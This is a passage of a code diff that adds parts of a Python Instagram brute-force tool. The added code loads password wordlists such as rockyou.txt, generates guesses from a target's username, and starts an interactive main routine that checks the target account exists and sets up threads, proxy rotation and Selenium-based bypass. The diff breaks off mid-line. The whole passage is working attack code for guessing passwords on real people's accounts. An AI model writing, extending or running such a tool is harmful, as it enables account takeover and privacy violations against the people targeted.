@@ -1229,3 +1229,163 @@ class AdvancedInstagramBruteForcer:
         
         print(f"📁 Results exported to: results/{filename}")
         return results
+
+def load_enhanced_password_list(file_path, target_username=None):
+    """Load and enhance password list with smart generation"""
+    passwords = set()  # Use set to avoid duplicates
+    
+    # Load from file
+    try:
+        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            for line in f:
+                password = line.strip()
+                if password and len(password) >= 1:
+                    passwords.add(password)
+    except Exception as e:
+        print(f"❌ Error loading password list: {e}")
+    
+    # Load from multiple common wordlists
+    wordlist_paths = [
+        'wordlists/rockyou.txt',
+        'wordlists/common.txt',
+        'passwords.txt',
+        '../passwords.txt',
+        'wordlists/instagram_common.txt'
+    ]
+    
+    for path in wordlist_paths:
+        try:
+            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+                for line in f:
+                    password = line.strip()
+                    if password:
+                        passwords.add(password)
+                        if len(passwords) >= 100000:  # Limit to prevent memory issues
+                            break
+        except:
+            continue
+    
+    # Generate smart passwords based on username
+    if target_username:
+        smart_passwords = generate_smart_passwords(target_username)
+        passwords.update(smart_passwords)
+    
+    password_list = list(passwords)
+    print(f"📋 Enhanced password list: {len(password_list):,} unique passwords")
+    return password_list
+
+def generate_smart_passwords(username):
+    """Generate smart password variations based on username"""
+    smart_passwords = set()
+    
+    # Basic variations
+    variations = [
+        username,
+        username.upper(),
+        username.lower(),
+        username.capitalize()
+    ]
+    
+    # Number combinations
+    numbers = ['123', '1234', '12345', '123456', '1', '01', '2024', '2025', '2023', '99', '00']
+    
+    # Special characters
+    special_chars = ['!', '@', '#', '$', '_', '.', '-']
+    
+    # Common suffixes/prefixes
+    common_words = ['love', 'baby', 'girl', 'boy', 'the', 'best', 'king', 'queen', 'admin', 'user']
+    
+    # Generate combinations
+    for var in variations:
+        smart_passwords.add(var)
+        
+        # Add numbers
+        for num in numbers:
+            smart_passwords.add(var + num)
+            smart_passwords.add(num + var)
+        
+        # Add special chars
+        for char in special_chars:
+            smart_passwords.add(var + char)
+            smart_passwords.add(char + var)
+            
+        # Add common words
+        for word in common_words:
+            smart_passwords.add(var + word)
+            smart_passwords.add(word + var)
+            
+        # Complex combinations
+        for num in ['123', '1', '2024']:
+            for char in ['!', '@', '_']:
+                smart_passwords.add(var + num + char)
+                smart_passwords.add(var + char + num)
+    
+    # Date-based passwords
+    current_year = datetime.now().year
+    for year in [current_year, current_year-1, current_year-2]:
+        smart_passwords.add(username + str(year))
+        smart_passwords.add(str(year) + username)
+    
+    return smart_passwords
+
+
+def main():
+    """Main function - Hardcore Instagram Brute Force"""
+    print("💀 HARDCORE INSTAGRAM BRUTE FORCE TOOL 2025")
+    print("⚠️  WARNING: Industrial grade tool - Use responsibly!")
+    print("🔥 Features: Multi-threading, Proxy rotation, Smart AI, Mobile+Web API, Selenium, TOR")
+    print("🚀 Advanced: Async operations, CAPTCHA solving, Device fingerprinting")
+    print("=" * 80)
+
+    # Configuration
+    target_username = input("🎯 Enter target username: ").strip()
+    if not target_username:
+        print("❌ Username is required!")
+        return
+
+    # Verify user exists (create temp instance with empty password list)
+    print(f"\n🔍 Verifying target user...")
+    temp_brute_forcer = AdvancedInstagramBruteForcer(target_username, ['dummy'])
+    if not temp_brute_forcer.check_instagram_user_exists(target_username):
+        confirm = input("⚠️  User may not exist. Continue anyway? (y/N): ")
+        if confirm.lower() != 'y':
+            return
+
+    # Advanced password list selection
+    print("\n📋 Advanced Password List Options:")
+    print("1. Enhanced wordlist + smart generation + mutations")
+    print("2. Multiple wordlists + advanced mutations")
+    print("3. Smart generation only (username-based)")
+    print("4. Custom wordlist path")
+    
+    choice = input("Choose option (1-4, default=1): ").strip() or "1"
+    
+    if choice == "1":
+        base_passwords = load_enhanced_password_list("../passwords.txt", target_username)
+        temp_instance = AdvancedInstagramBruteForcer(target_username, [])
+        mutations = temp_instance.generate_mutation_passwords(base_passwords)
+        passwords = list(set(base_passwords + mutations))
+    elif choice == "2":
+        temp_instance = AdvancedInstagramBruteForcer(target_username, [])
+        base_passwords = temp_instance.load_custom_wordlists()
+        mutations = temp_instance.generate_mutation_passwords(base_passwords)
+        passwords = list(set(base_passwords + mutations))
+    elif choice == "3":
+        passwords = list(generate_smart_passwords(target_username))
+        print(f"📋 Generated {len(passwords)} smart passwords")
+    elif choice == "4":
+        custom_path = input("Enter wordlist path: ").strip()
+        passwords = load_enhanced_password_list(custom_path, target_username)
+    else:
+        print("❌ Invalid choice!")
+        return
+
+    if not passwords:
+        print("❌ No passwords loaded. Exiting.")
+        return
+
+    # Advanced attack configuration
+    print(f"\n⚙️  ADVANCED ATTACK CONFIGURATION:")
+    max_threads = int(input("🧵 Max threads (default=15): ").strip() or "15")
+    use_proxies = input("🌐 Use proxies? (Y/n): ").strip().lower() != 'n'
+    use_selenium = input("🤖 Use Selenium for advanced bypass? (y/N): "
